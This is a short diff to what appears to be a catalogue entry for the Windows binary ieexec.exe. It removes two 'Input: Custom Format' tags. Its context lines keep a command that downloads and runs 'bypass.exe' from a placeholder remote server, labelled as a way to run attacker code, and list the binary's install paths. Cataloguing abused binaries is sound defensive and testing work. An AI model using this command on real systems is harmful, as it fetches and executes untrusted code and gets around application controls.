@@ -14,7 +14,6 @@ Commands:
     Tags:
       - Execute: Remote
       - Execute: .NetEXE
-      - Input: Custom Format
   - Command: ieexec.exe http://x.x.x.x:8080/bypass.exe
     Description: Downloads and executes bypass.exe from the remote server.
     Usecase: Download and run attacker code from remote location
@@ -25,7 +24,6 @@ Commands:
     Tags:
       - Execute: Remote
       - Execute: .NetEXE
-      - Input: Custom Format
 Full_Path:
   - Path: C:\Windows\Microsoft.NET\Framework\v2.0.50727\ieexec.exe
   - Path: C:\Windows\Microsoft.NET\Framework64\v2.0.50727\ieexec.exe
